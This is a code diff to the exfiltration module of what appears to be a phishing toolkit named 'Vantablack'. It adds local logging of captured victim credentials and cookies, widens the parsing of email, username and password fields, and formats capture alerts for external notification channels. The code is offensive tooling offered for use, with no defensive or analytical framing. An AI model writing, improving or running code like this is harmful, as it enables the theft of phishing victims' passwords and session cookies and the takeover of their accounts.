@@ -1,6 +1,7 @@
 import aiohttp
 import asyncio
 import json
+import time
 from typing import Dict, Any, Optional
 from core.common.config import get
 
@@ -18,6 +19,10 @@ class ExfiltrationManager:
         """
         Envoie une notification lors d'une capture (credentials ou cookies).
         """
+        # 1. Log to file locally (Reliability)
+        self._log_capture_locally(session_id, data, data_type)
+        
+        # 2. External Notifications
         message = self._format_message(session_id, data, data_type)
         
         tasks = []
@@ -30,13 +35,29 @@ class ExfiltrationManager:
         if tasks:
             await asyncio.gather(*tasks, return_exceptions=True)
             
+    def _log_capture_locally(self, session_id: str, data: Dict[str, Any], data_type: str):
+        """Logs capture to local file for persistence."""
+        try:
+            log_entry = {
+                "timestamp": time.time(),
+                "session_id": session_id,
+                "type": data_type,
+                "data": data
+            }
+            # Use absolute path or relative to project root
+            # Assuming CWD is project root
+            with open("core/logs/captures.jsonl", "a") as f:
+                f.write(json.dumps(log_entry) + "\n")
+        except Exception as e:
+            print(f"Local Log Error: {e}")
+
     def _format_message(self, session_id: str, data: Dict[str, Any], data_type: str) -> str:
         """Formate le message pour les notifications."""
         icon = "🔑" if data_type == "credentials" else "🍪"
         title = f"{icon} Vantablack Capture: {data_type.upper()}"
         
         campaign_id = data.get("campaign_id", "Unknown")
-        ip = data.get("ip", "Unknown")
+        ip = data.get("client_ip", data.get("ip", "Unknown"))
         user_agent = data.get("user_agent", "Unknown")
         
         # Masquer partiellement les mots de passe/cookies pour la notif (sécurité opsec)
@@ -49,13 +70,17 @@ class ExfiltrationManager:
         content += f"📱 UA: `{user_agent}`\n"
         
         if data_type == "credentials":
-            email = data.get("email", "N/A")
-            password = data.get("password", "******")
+            # Check captured_data first (from session object)
+            captured = data.get("captured_data", data)
+            email = captured.get("email", captured.get("username", "N/A"))
+            password = captured.get("password", captured.get("pass", "******"))
+            
             content += f"📧 Email: `{email}`\n"
             content += f"🔒 Password: `{password}`\n"
             
         elif data_type == "cookies":
-            cookie_count = len(data.get("cookies", []))
+            cookies = data.get("cookies", [])
+            cookie_count = len(cookies)
             content += f"🍪 Cookies Captured: {cookie_count}\n"
             
         return content
